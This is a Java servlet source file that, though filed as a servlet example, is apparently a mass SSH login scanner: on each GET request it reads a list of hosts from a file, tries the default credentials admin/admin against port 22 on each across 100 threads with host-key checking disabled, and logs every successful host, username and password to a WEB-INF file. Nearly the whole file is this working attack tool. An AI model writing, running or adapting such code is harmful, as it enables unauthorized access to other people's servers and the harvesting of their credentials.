/**
 * 
 */
package com.phule.servletexample.servlet;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;

/**
 * @author BH4Ljfe
 *
 */
public class HomeServlet extends HttpServlet {

	/**
	 * 
	 */
	private static final long serialVersionUID = 1L;
	ArrayList<SSHInfo> sshList = new ArrayList<SSHInfo>();
	ArrayList<Authentication> authenList = new ArrayList<Authentication>();
	@Override
	protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
		if(sshList.size() == 0) {
			String filename = "/WEB-INF/results116.txt";
			
			ServletContext context = getServletContext();
			// First get the file InputStream using ServletContext.getResourceAsStream()
	        // method.
	        InputStream is = context.getResourceAsStream(filename);
	        if (is != null) {
	            InputStreamReader isr = new InputStreamReader(is);
	            BufferedReader reader = new BufferedReader(isr);
	            String text;

	            // We read the file line by line and later will be displayed on the
	            // browser page.
	            while ((text = reader.readLine()) != null) {
	            	SSHInfo ssh = new SSHInfo();
	            	ssh.setHost(text);
	            	sshList.add(ssh);
	            }
	            Authentication authen = new Authentication();
	            authen.setUsername("admin");
	            authen.setPassword("admin");
	            authenList.add(authen);
	        }
		}
		int numberOfThread = 100;
        int totalHost = sshList.size();
	    int TotalHostModTotalThread = totalHost % numberOfThread;
	    int TotalHostDivTotalThread = totalHost / numberOfThread;
		ExecutorService executor = Executors.newFixedThreadPool(numberOfThread);
		for (int i = 0; i < numberOfThread; i++) {
			if (i < TotalHostModTotalThread)
            {
                int beginIndex = TotalHostDivTotalThread * i;
                int endIndex = i == 0 ? TotalHostDivTotalThread + 1 : TotalHostDivTotalThread * i + TotalHostDivTotalThread + 1;
                Runnable worker = new MyRunnable(sshList,beginIndex,endIndex,authenList,i,7000);
    			executor.execute(worker);
            }
            else
            {
                int beginIndex = TotalHostDivTotalThread * i;
                int endIndex = i == 0 ? TotalHostDivTotalThread : TotalHostDivTotalThread * i + TotalHostDivTotalThread;
                Runnable worker = new MyRunnable(sshList,beginIndex,endIndex,authenList,i,7000);
    			executor.execute(worker);
            }
			
		}
		executor.shutdown();
		// Wait until all threads are finish
		while (!executor.isTerminated()) {
 
		}
		System.out.println("\nFinished all threads");

	}

	@Override
	protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

	}
	public class MyRunnable implements Runnable {
		private int noThread;
		private ArrayList<SSHInfo> sshList = new ArrayList<SSHInfo>();
		private int beginIndex;
		private int endIndex;
		private ArrayList<Authentication> authenList = new ArrayList<Authentication>();
		private int timeOut;
		MyRunnable(ArrayList<SSHInfo> sshList,int beginIndex,int endIndex,ArrayList<Authentication> authenList,int noThread,int timeout) {
			this.sshList = sshList;
			this.noThread = noThread;
			this.beginIndex = beginIndex;
			this.endIndex = endIndex;
			this.timeOut = timeout;
			this.authenList = authenList;
		}
 
		public void run() {
			for (int i = beginIndex; i < endIndex; i++)
            {
                for (int j = 0; j < authenList.size(); j++)
                {
                	JSch jsch = new JSch();
        			String host = sshList.get(i).getHost();
        			String user = authenList.get(j).getUsername();
        			Session session;
        			try {
        				session = jsch.getSession(user, host, 22);
        				String passwd = authenList.get(j).getPassword();
        				session.setPassword(passwd);
        				session.setConfig("StrictHostKeyChecking", "no");
        				// It must not be recommended, but if you want to skip host-key check,
        				// invoke following,
        				// session.setConfig("StrictHostKeyChecking", "no");

        				// session.connect();
        				session.connect(timeOut); // making a connection with timeout.
        				System.out.println(noThread+": Successfully.");
        				 try {
        					String successfully = "/WEB-INF/successfully.txt";
        					ServletContext context = getServletContext();
	        				File file = new File(context.getRealPath(successfully));
	        				if(!file.exists()){
	        					file.createNewFile();
	        				}
	        	            FileWriter fw = new FileWriter(file,true);
		        	      	BufferedWriter bw = new BufferedWriter(fw);
		        	      	PrintWriter pw = new PrintWriter(bw);
		        	      	pw.println(host+"|"+user+"|"+passwd);
		        	      	pw.close();
						} catch (IOException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
        				break;
        	            
        				
        			}
        			catch (JSchException e) {
        				String me = e.getMessage();
        				System.out.println(noThread+": "+me);
        				if(e.getMessage().contains("Auth cancel")){
        					//wrong username or password
        					System.out.println(noThread+": Authentication cancel.");
        				}
        				if(e.getMessage().contains("timeout: socket is not established")){
        					System.out.println(noThread+" Connection time out");
        					break;
        				}
        			}
                }
            }
			
		}

		public int getNoThread() {
			return noThread;
		}

		public void setNoThread(int noThread) {
			this.noThread = noThread;
		}

		public ArrayList<SSHInfo> getSshList() {
			return sshList;
		}

		public void setSshList(ArrayList<SSHInfo> sshList) {
			this.sshList = sshList;
		}

		public int getBeginIndex() {
			return beginIndex;
		}

		public void setBeginIndex(int beginIndex) {
			this.beginIndex = beginIndex;
		}

		public int getEndIndex() {
			return endIndex;
		}

		public void setEndIndex(int endIndex) {
			this.endIndex = endIndex;
		}

		public ArrayList<Authentication> getAuthenList() {
			return authenList;
		}

		public void setAuthenList(ArrayList<Authentication> authenList) {
			this.authenList = authenList;
		}
		
		
	}
}


